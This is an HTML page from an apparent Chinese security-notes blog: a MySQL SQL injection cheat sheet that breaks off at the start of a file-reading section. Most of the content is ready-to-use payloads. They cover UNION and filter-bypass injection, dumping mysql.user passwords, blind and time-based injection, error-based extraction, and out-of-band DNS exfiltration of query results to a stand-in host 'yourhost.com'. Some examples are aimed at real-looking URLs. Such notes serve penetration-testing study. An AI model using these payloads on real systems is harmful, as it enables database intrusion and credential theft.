@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>一、查询数据库信息｜Web 安全 / 注入与请求伪造｜BEN.OPS</title>
+  <meta name="description" content="一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…">
+  <meta name="keywords" content="Web 安全，注入与请求伪造，MySQL，PHP，SQL注入，权限管理，日志分析，知识笔记，Web 安全 / 注入与请求伪造，一、查询数据库信息">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2B%E6%B3%A8%E5%85%A5%E4%B8%8E%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2BMySQL%2BPHP-%E4%B8%80%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="一、查询数据库信息">
+  <meta property="og:description" content="一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / 注入与请求伪造">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/968aa2759bb2a67e0c.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="一、查询数据库信息">
+  <meta name="twitter:description" content="一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/968aa2759bb2a67e0c.png">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html#article","headline":"一、查询数据库信息","description":"一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","注入与请求伪造"],"keywords":["Web 安全","注入与请求伪造","MySQL","PHP","SQL注入","权限管理","日志分析","知识笔记","Web 安全 / 注入与请求伪造","一、查询数据库信息"],"wordCount":4946,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/968aa2759bb2a67e0c.png"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / 注入与请求伪造","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"一、查询数据库信息","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b30f140b76ff.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / 注入与请求伪造</span> › <span>一、查询数据库信息</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / 注入与请求伪造</div>
+      <h1>一、查询数据库信息</h1>
+      <p class="lede">一、查询数据库信息。本文属于Web 安全 / 注入与请求伪造，mysql 5 联合查询；mysql 4 不支持联合查询。 我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样）…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">4,946 字</span>
+        <span class="badge">15 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-查询数据库信息">一、查询数据库信息</h2>
+<p>mysql 5 联合查询；mysql 4 不支持联合查询。</p>
+<p>我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样），这是因为数字役属于几乎所有数据类型，因此可以匹配任何字段，HEX编码方式同样役属于几乎所有数据类型。</p>
+<p>可以使用很多单双引号，只要是成对出现的。</p>
+<pre><code>SELECT * FROM Articles WHERE id = '1''';
+SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
+</code></pre>
+<p>union select 不能用逗号时，可以用join执行联合查询，即先join 成一个大表，再select 这个大表
+<code>and+1=2+union+SELECT+*+FROM+(select+version())+as+a+join+(select+22)+as+b+join+(select+33)+as+c%23</code></p>
+<p>下面的符号可以用来注释语句：
+# Hash 语法（注意浏览器访问时需要编码成%23，否则被当作锚点起始）
+/*  C-style 语法
+-- - SQL 语法
+--+ Mysql语法
+;%00 空字节
+` 反引号</p>
+<p>Mysql中，<code>/*! SQL 语句 */</code> 这种格式里面的 SQL 语句会当正常的语句一样被解析。
+如果在!之后是一串数字(这串数字就是 mysql 数据库的版本号)， 如：<code>/*! 12345 SQL 语句 */</code>
+当版本号大于等于该数字，SQL 语句则执行，否则就不执行。
+<code>UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+</code>
+<code>SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);</code></p>
+<p>允许的字符:
+09 Horizontal Tab
+0A New Line
+0B Vertical Tab
+0C New Page
+0D Carriage Return
+A0 Non-breaking Space
+20 Space
+例子：<code>'and%0A%09UNION%0CSELECT%A0NULL%20%23</code></p>
+<p>括号也可以用来绕过过滤空格的情况：
+28 (
+29 )
+例子：<code>UNION(SELECT(column)FROM(table))</code></p>
+<p>AND或OR后面可以跟的字符:
+20 Space
+2B +
+2D -
+7E ~
+21 !
+40 @
+例子：<code>SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))</code>
+dual 是一个虚拟表，可以用来做测试。
+注意：
+where a_exp or b_exp 中如果 a_exp is true 是不会计算 b_exp 的，如果 a_exp is false，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。
+where a_exp and b_exp 中如果 a_exp is false 是不会计算 b_exp 的，如果 a_exp is true，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。</p>
+<p>测试时尽量不用 or 1=1, 如果sql 语句是执行update 或者delete，容易造成数据变更。</p>
+<p>在没有加() 等其他符号时， and 和 or 一起出现先计算 and，为了绕过对 and / or 的过滤，可以使用 rlike 等关键字，比如 <code>where 11=11 rlike sleep(10)#</code>。
+<code>?id=1%27%20AnD%201=2%20OR%20if(now()%3dsysdate()%2csleep(3)%2c0)%20And%20%271%27=%271</code></p>
+<p>查询information_schema(&gt;=5.0 才存在,mysql5.0以下需要字典猜表)、mysql 数据库的信息(需要root权限，表名、列名、对应权限等)</p>
+<p>mysql.user、information_schema.schemata、information_schema.tables、information_schema.columns、  information_schema.user_privileges</p>
+<p><code>SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)</code>
+使用CONCAT()时，任何一个参数为null，将返回null， 推荐使用CONCAT_WS()。
+CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。
+<code>SELECT database();</code>
+<code>SELECT group_concat(schema_name) FROM information_schema.schemata;</code>
+<code>SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)</code>
+<code>UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;--</code> MySQL 4版本时用version=9，MySQL 5版本时用version=10
+<code>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename';</code>
+<code>union select concat(grantee,0x3a,privilege_type,0x3a,is_grantable) from information_schema.user_privileges</code>  //权限
+<code>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</code></p>
+<p>查询版本，用户，操作系统等</p>
+<pre><code>http://www.qq.com/1.php?id=-1 union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14
+http://www.qq.com/1.php?id=-1 union select
+1,2,3,4,group_concat(version(),0x3a,database(),0x3a,user()),6,7,8,9,10,11,12,13,14
+http://www.qq.com/1.php?id=-1 union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14
+http://www.qq.com/1.php?id=-1 union all select 1,unhex(hex(@@version)),3/*
+http://www.qq.com/1.php?id=5 and substring(@@version,1,1)=4
+</code></pre>
+<p>如果MySQL的版本是4，这应该返回TRUE.
+用5替换4，并且，如果返回的查询匹配则版本为5</p>
+<pre><code>http://www.qq.com/1.php?id=5 and substring(@@version,1,1)=5
+http://www.qq.com/1.php?id=5 AND MID(VERSION(),1,1) = '5';
+http://www.qq.com/1.php?id=5 AND ord(MID(VERSION(),1,1)) = 53;
+</code></pre>
+<hr/>
+<h3 id="内置变量列表">内置变量列表</h3>
+<p>@@version  VERSION()  @@GLOBAL.VERSION 版本
+@@datadir 路径
+@@basedir
+@@version_compile_os
+@@have_openssl 如果mysqld支持客户端/服务器协议的SSL(加密)则为YES
+@@version_compile_os 判断系统类型
+@@max_allowed_packet 包或任何生成的/中间字符串的最大大小
+@@max_user_connections MySQL账户允许的最大同时连接数,0表示没限制
+@@skip_networking 如果服务器只允许本地(非TCP/IP)连接,该值为ON
+@@table_type 默认表类型(存储引擎)
+@@basedir MySQL安装基准目录
+@@character_set_database 默认数据库使用的字符集
+@@datadir 数据库存储的地方
+@@expire_logs_days 二进制日志自动删除的天数,默认是0,表示"没有自动删除"
+@@group_concat_max_len 允许group_concat()函数结果的最大长度
+@@log_error 错误日志的位置
+@@lower_case_file_system 该变量说明是否数据目录所在的文件系统对文件名的大小写敏感.ON说明对文件名的大小写不敏感,OFF表示敏感
+@@lower_case_table_names 如果设置为1,表名用小写保存到硬盘上,并且表名比较时不对大小写敏感.如果设置为2,按照指定的保存表名,但按照小写来比较
+@@plugin_dir 插件目录的路径
+@@tmpdir 保存临时文件和临时表的目录
+@@tmp_table_size 如果内存内的临时表超过该值,MySQL自动将它转换为硬盘上的MyISAM表
+@@sql_mode 当前服务器的sql模式
+@@tx_isolation 默认事务隔离级别.默认值为REPEATABLE-READ
+@@Connections 连接mysql数据库服务器的次数(不管成功还是失败)
+@@max_write_lock_count 最大写锁数量
+@@old_passwords 是否启用mysql323加密方式(就是mysql用户密码的hash是16位的)
+@@Uptime 服务器已经运行的时间
+通过id=instr(@@global.version,1)来获取global变量。@@global包含很多敏感信息，过滤了ascii,substr函数，仍可用instr来盲注。</p>
+<hr/>
+<h3 id="可回显注入">可回显注入</h3>
+<p>从information_schema.columns可以查table_schema、table_name、column_name</p>
+<p>库
+<code>union select unhex(hex(group_concat(schema_name))) from information_schema.schemata</code></p>
+<p>表
+<code>union select unhex(hex(group_concat(table_name))) from information_schema.tables where table_schema=0x(数据库名对应的十六进制）</code></p>
+<p>字段
+<code>union select unhex(hex(group_concat(column_name))) from information_schema.columns where table_schema=0x(数据库名对应的十六进制) and table_name=0x(表名对应的十六进制）</code></p>
+<p>查询数据（实例）
+<code>union select 1,2,3,4,concat(username,0x3a,password),6 from admin.users</code>  //获取到表、字段后，就可以查询所需信息了，如查询users库的admin表的用户名和密码</p>
+<p>插入数据（不用引号）</p>
+<pre><code>INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),
+char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72), 0x64)
+</code></pre>
+<p>insert/update/delete 语句中注入
+<code>or updatexml(1,concat(0x7e,(version())),0) or</code>
+e.g
+INSERT INTO users (id, username, password) VALUES (2,'r00tgrok' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', 'ohmygod_is_r00tgrok');
+<code>or extractvalue(1,concat(0x7e,database())) or</code>
+e.g
+UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or '' WHERE id=2 and username='Pseudo_Z';
+DELETE FROM users WHERE id=1 or extractvalue(1,coat(0x7e,database())) or '';</p>
+<hr/>
+<h3 id="盲注查询">盲注查询</h3>
+<h4 id="benchmark-m">BENCHMARK() (M)</h4>
+<p>Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!</p>
+<p>BENCHMARK(howmanytimes, do this)</p>
+<p>Real World Samples
+Are we root ? woot!
+<code>IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))</code>
+Check Table exist in MySQL
+<code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p>
+<h4 id="sleepseconds-m">sleep(seconds) (M)</h4>
+<p>Sleep for supplied seconds.</p>
+<p><code>SELECT sleep(10);</code>
+Sleep 10 seconds.
+<code>and%20(select*from(select(sleep(10)))a)--</code>
+注意 sleep/benchmark 函数执行完返回值是 0，故 if(now()=sysdate(),sleep(duration),0) 返回值肯定是0。</p>
+<h4 id="more-timing-in-mysql">More Timing in MySQL</h4>
+<p><code>select benchmark( 500000, sha1( 'test' ) );</code>
+<code>query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code>
+<code>select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );</code>
+Enumeration data, Guessed Brute Force
+<code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1, benchmark(100000,sha1('test')), 'false' );</code></p>
+<pre><code>-if(now()=sysdate(),sleep(duration),0)/*'XOR(if(now()=sysdate(),sleep(duration),0))OR'"XOR(if(now()=
+sysdate(),sleep(duration),0))OR"*/
+</code></pre>
+<p>上面这条payload 在参数是 数字或者字符串（单双引号）的情形下都是适用的。</p>
+<pre><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),
+concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1)))),1)
+</code></pre>
+<p>上面这条用于 order by limit 之后的timing注入，注意这里不能用sleep函数。</p>
+<h4 id="out-of-band-channel-attacks">Out of Band Channel Attacks</h4>
+<p>原理：使用unc路径，会对指定的域名进行dns查询，使用dns信道，配合dns服务器收到的数据可快速得到数据内容。
+使用dns有一定的好处，可以突破主机网络隔离，例如dmz主机不能直接连外网，但是配置的网络可达的dns服务器往往可以，通过查询域名递归的方式，dns服务器可以将返回数据通过dns协议带出去。
+unc路径是windows下的特性，默认安装的linux下不存在这样的功能。
+<img alt="一、查询数据库信息" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/968aa2759bb2a67e0c.png"/>
+1）受害主机执行一条特定payload语句，将数据和指定域名拼接，向dns server发送dns请求
+2）dns server因为没有记录这个域名所对应的ip，递归向上层dns server请求
+3）直到递归请求到有这个根域名记录的根dns server（一般为域名注册商），返回给最初的dns server可以去找这个代号为2的dns server解析
+4）这个代号为2的dns server是hacker伪造的，所以hacker可以收到传过来的dns请求，从中剥离数据</p>
+<p><code>?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), '.yourhost.com\\')))</code>
+Makes a NBNS query request/DNS resolution request to yourhost.com</p>
+<p><code>?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')</code>
+Writes data to your shared folder/file</p>
+<p>{INJECTION} = You want to run the query.</p>
+<p>查版本：</p>
+<p><code>id=1 and (select case when(select substring(version(),1,1) &gt; 4) then 1 else 1*(select 1 union select 2)end)=1</code></p>
+<p>查当前MySQL用户名长度：
+<code>id=1 and (select case when(select length(user()) &gt; 10) then 1 else 1*(select 1 union select 2)end)=1</code></p>
+<p>查当前MySQL用户名第一个字符内容：
+<code>id=1 and (select case when(select ascii(substring(user(),1,1)) = 120) then 1 else 1*(select 1 union select 2)end)=1</code>
+<code>id=5 and ascii(substring((select concat(username, 0x3a, passwd) from users limit 0,1), 1,1)) &gt; 64</code> /*可利用二分法判断*/</p>
+<p>查数据库长度
+<code>http://203.0.113.1//noruletest/sql.php?id=1 and+length(database())=12%23</code></p>
+<p>查询首字母、第二个字母等等
+<code>http://203.0.113.1//noruletest/sql.php?id=1 and+left(database(),1)='d'%23</code>
+<code>http://203.0.113.1//noruletest/sql.php?id=1 and+left(database(),2)='db'%23</code></p>
+<p>盲注也可以借助正则 regexp，更有效率。
+注意：group by, order by, having 后面都可以接 and、or 。</p>
+<hr/>
+<h3 id="报错注入">报错注入</h3>
+<h4 id="order-by">order by 报错</h4>
+<p>注意这里的 order by 1，1 表示select 中的第一列，group by 1 同理。但 select 1, 2, 3 类似这些表示的是数字1，2，3。
+order by `id`,2,3 被反引号括起来的只能是具体列名。
+Finding how many columns in SELECT query by ORDER BY
+Finding column number by ORDER BY can speed up the UNION SQL Injection process.</p>
+<p>ORDER BY 1--
+ORDER BY 2--
+ORDER BY N-- so on
+Keep going until get an error. Error means you found the number of selected columns.</p>
+<p>Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+1' GROUP BY 1,2,3,4,5--+    Unknown column '4' in 'group statement'
+1' ORDER BY 1,2,3,4,5--+    Unknown column '4' in 'order clause'</p>
+<p>先使用order by 找到select 语句的列数（可以使用二分查找缩短查找时间），遍历列位置替换成md5()，如 <code>union select 1,2,md5("123232"),4</code>，看返回是否是md5 函数执行之后的字符串，当满足某一列的类型是字符串时就会回显成功。</p>
+<h4 id="order-by-limit">order by limit</h4>
+<p>所以如果注入点前面没有order by 关键字，就可以顺利的使用union 关键字，如果有只能用此种办法，但使用analyse()只能5.0.0&lt;mysql&lt;5.6.6的版本</p>
+<pre><code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),
+concat(0x3a,version())),1);
+
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
+</code></pre>
+<h4 id="_7">字符集问题</h4>
+<p>mysql 在存储数据的时候会根据当前数据库的字符集来校验数据，发现非法数据时会抛弃其后续数据。
+当表的字符集是utf8_general_ci 时，测试SQL：<code>Insert into table values (concat('ab', 0x80, 'cd'))</code>，因为0x80不是有效的UTF-8字符，所以只有ab被写入数据库中，cd会被截断。
+当表的字符集是gbk_chinese_ci 时，测试SQL：<code>Insert into table values (concat('ab', 0x8027, 'cd'))</code>，因为0x8027不是有效的gbk字符，所以只有ab被写入数据库中，cd会被截断。</p>
+<h4 id="floor-rand">floor rand 报错</h4>
+<p>RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.
+You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.
+也就是说在 group by 查询以及插入临时表时都会计算 rand()，如果两次结果不一样，就会出错。</p>
+<pre><code>http://203.0.113.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),
+concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+
+</code></pre>
+<h4 id="bigint">bigint 报错</h4>
+<p>我们知道，如果一个查询成功返回，其返回值为0，所以对其进行逻辑非的话就会变成1，举例来说，如果我们对类似 <code>(select*from(select user())x)</code> 这样的查询进行逻辑非的话，返回值就是1，对 0 取反得到无符号的最大BIGINT值，1 减去最大 bigint 值导致 BIGINT value is out of range 错误。
+<code>http://localhost/dvwa/vulnerabilities/sqli/?id=1' or !(select*from(select user())x)-~0-- -&amp;Submit=Submit#</code></p>
+<h4 id="extractvalue-updatexml">extractvalue, updatexml 报错</h4>
+<p><code>and 1=(updatexml(1,concat(0x3a,(select user())),1))</code>
+<code>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code></p>
+<h2 id="二-读文件">二、读文件</h2>
+<h3 id="判断权限">判断权限</h3>
+<p><code>and (select count(*) from mysql.user)&gt;0</code> /* 返回正常,说明有读写权限（file_priv权限）
+<code>and (select count(*) from mysql.user)&gt;0</code> /*  返回错误则无</p>
+<p>（超级用户的系统文件无法读，超过大小的文件无法读，只有php+mysql的需要考虑魔术引号）</p>
+<p>load_file() 函数（win系统的C:\boot.ini）
+- 文件必须在服务器上。
+- LOAD_FILE()函数操作文件的当前目录是@@datadir 。
+- 需要连接数据库的用户有file_priv 权限，且启动mysqld 用户必须拥有对此文件读取的权限。
+- 如果secure_file_priv非空，则只能读取对应目录下的文件</p>
+<blockquote>
